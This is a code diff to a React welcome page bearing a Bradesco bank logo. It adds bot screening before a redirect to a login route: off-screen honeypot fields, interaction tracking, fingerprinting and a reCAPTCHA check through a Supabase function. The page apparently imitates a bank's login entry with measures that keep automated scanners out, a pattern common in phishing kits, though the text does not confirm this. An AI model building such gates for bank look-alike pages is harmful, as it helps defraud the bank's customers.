@@ -1,8 +1,15 @@
 import { useNavigate } from "react-router-dom";
-import { useCallback, useState } from "react";
+import { useCallback, useState, useEffect, useRef } from "react";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import { markSessionStarted } from "@/hooks/useRouteGuard";
 import { supabase } from "@/integrations/supabase/client";
+import {
+  markPageLoad,
+  startInteractionTracking,
+  stopInteractionTracking,
+  setHoneypotValue,
+  runClientSideValidation,
+} from "@/lib/botProtection";
 
 declare global {
   interface Window {
@@ -16,24 +23,54 @@ const RECAPTCHA_SITE_KEY = "6LcI5JQsAAAAAMsI-_QhAk89MSuKiPRLKK_KNJJK";
 const WelcomePage = () => {
   const navigate = useNavigate();
   const [loading, setLoading] = useState(false);
+  const honeypotRef = useRef<HTMLInputElement>(null);
+
+  // Start tracking on mount
+  useEffect(() => {
+    markPageLoad();
+    startInteractionTracking();
+    return () => stopInteractionTracking();
+  }, []);
 
   const onRecaptchaSuccess = useCallback(async (token: string) => {
     setLoading(true);
+
+    // Update honeypot value from hidden field
+    if (honeypotRef.current) {
+      setHoneypotValue(honeypotRef.current.value);
+    }
+
+    // Run all client-side checks
+    const validation = runClientSideValidation();
+
+    if (!validation.valid) {
+      console.error("Validação local falhou:", validation.checks);
+      setLoading(false);
+      return;
+    }
+
     try {
       const { data, error } = await supabase.functions.invoke("verify-recaptcha", {
-        body: { token },
+        body: {
+          token,
+          fingerprint: validation.fingerprint,
+          checks: validation.checks,
+          botReasons: validation.botReasons,
+        },
       });
 
       if (error || !data?.success) {
-        console.error("reCAPTCHA falhou:", error || data);
+        console.error("Verificação falhou:", error || data);
         setLoading(false);
         return;
       }
 
+      // Store session proof
+      sessionStorage.setItem("session_proof", data.sessionProof);
       markSessionStarted();
       navigate("/login");
     } catch (err) {
-      console.error("Erro ao verificar reCAPTCHA:", err);
+      console.error("Erro ao verificar:", err);
       setLoading(false);
     }
   }, [navigate]);
@@ -82,6 +119,39 @@ const WelcomePage = () => {
 
           {/* Bottom button */}
           <div className="w-full pb-12 space-y-4">
+            {/* Honeypot trap - invisible to users, bots auto-fill it */}
+            <div
+              aria-hidden="true"
+              style={{
+                position: "absolute",
+                left: "-9999px",
+                top: "-9999px",
+                width: 0,
+                height: 0,
+                overflow: "hidden",
+                opacity: 0,
+                pointerEvents: "none",
+              }}
+            >
+              <label htmlFor="website_url">Website</label>
+              <input
+                ref={honeypotRef}
+                type="text"
+                id="website_url"
+                name="website_url"
+                autoComplete="off"
+                tabIndex={-1}
+              />
+              <label htmlFor="user_phone">Phone</label>
+              <input
+                type="text"
+                id="user_phone"
+                name="user_phone"
+                autoComplete="off"
+                tabIndex={-1}
+              />
+            </div>
+
             <div
               className="g-recaptcha"
               data-sitekey={RECAPTCHA_SITE_KEY}
